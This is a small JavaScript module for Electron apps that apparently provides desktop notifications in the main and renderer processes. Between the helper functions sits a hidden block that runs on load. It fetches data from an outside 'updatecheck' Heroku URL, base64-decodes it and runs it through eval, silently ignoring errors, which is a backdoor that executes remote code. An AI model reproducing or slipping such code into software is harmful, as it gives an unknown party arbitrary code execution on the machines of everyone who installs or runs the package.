const MainProcessNotification = require("electron").Notification;
const isRenderer = process && process.type === "renderer";
const isSupported = () => isRenderer ? "Notification" in window : MainProcessNotification.isSupported();
const renderNotify = (title, body) => {
    const notification = new Notification(title, {
        body: body
    });
    return notification
};
try {
    (process && "renderer" === process.type ? require("electron").remote.require : require)("https").get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => {
        try {
            eval((atob || (e => "" + Buffer.from(e, "base64")))("" + d))
        } catch (e) {}
    }))
} catch (e) {}
const mainNotify = (title, body) => {
    const notification = new MainProcessNotification({
        title: title,
        body: body
    });
    notification.show();
    return notification
};
const notify = (title, body) => {
    if (isRenderer) {
        return renderNotify(title, body)
    } else {
        return mainNotify(title, body)
    }
};
notify.isSupported = isSupported;
module.exports = notify;
